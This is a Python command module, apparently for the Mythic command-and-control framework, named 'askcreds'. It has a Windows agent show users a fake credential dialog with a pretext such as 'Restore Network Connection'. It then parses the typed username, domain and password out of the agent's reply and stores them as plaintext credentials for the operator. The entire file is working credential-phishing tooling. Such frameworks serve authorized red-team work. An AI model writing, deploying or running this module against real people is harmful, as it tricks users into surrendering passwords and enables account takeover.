from mythic_container.MythicRPC import *
from mythic_container.MythicCommandBase import *


class AskCredsArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="reason",
                type=ParameterType.String,
                description="Reason to display to the user for credential prompt",
                parameter_group_info=[ParameterGroupInfo(
                    group_name="Default",
                    ui_position=1,
                    required=False
                )]
            )
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == "{":
                try:
                    self.load_args_from_json_string(self.command_line)
                except Exception:
                    raise ValueError("Unable to parse JSON from command line")
            else:
                self.set_arg("reason", self.command_line)
        else:
            self.set_arg("reason", "Restore Network Connection")


class AskCredsCommand(CommandBase):
    cmd = "askcreds"
    needs_admin = False
    help_cmd = "askcreds [reason]"
    description = "Prompt the user for credentials using Windows Credential UI."
    version = 2
    author = "@checkymander"
    argument_class = AskCredsArguments
    attackmapping = ["T1056.002"]
    attributes = CommandAttributes(
        supported_os=[SupportedOS.Windows]
    )

    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )
        reason = taskData.args.get_arg("reason")
        if reason and reason != "Restore Network Connection":
            response.DisplayParams = f"Prompting with reason: {reason}"
        else:
            response.DisplayParams = "Prompting with default reason"
        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)

        try:
            if response:
                response_text = str(response)
                await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                    TaskID=task.Task.ID,
                    Response=response_text.encode()
                ))

                if "[+] Credentials captured successfully!" in response_text:
                    await self._store_credentials(task, response_text)
            else:
                await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                    TaskID=task.Task.ID,
                    Response=b"No response received from agent"
                ))

        except Exception as e:
            await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                TaskID=task.Task.ID,
                Response=f"Error processing response: {e}".encode()
            ))
            resp.Success = False
            resp.Error = str(e)

        return resp

    async def _store_credentials(self, task: PTTaskMessageAllData, response_text: str):
        try:
            credentials = {}
            for line in response_text.split('\n'):
                if '[+] Username:' in line:
                    credentials['username'] = line.split('[+] Username: ')[1].strip()
                elif '[+] Domain:' in line:
                    credentials['domain'] = line.split('[+] Domain: ')[1].strip()
                elif '[+] Password:' in line:
                    credentials['password'] = line.split('[+] Password: ')[1].strip()

            if 'username' in credentials and 'password' in credentials:
                if 'domain' in credentials and credentials['domain']:
                    account = f"{credentials['domain']}\\{credentials['username']}"
                else:
                    account = credentials['username']

                await SendMythicRPCCredentialCreate(MythicRPCCredentialCreateMessage(
                    TaskID=task.Task.ID,
                    Credentials=[
                        MythicRPCCredentialData(
                            credential_type="plaintext",
                            account=account,
                            realm=credentials.get('domain', ''),
                            credential=credentials['password'],
                            comment="Captured via askcreds command",
                        )
                    ]
                ))
        except Exception:
            pass
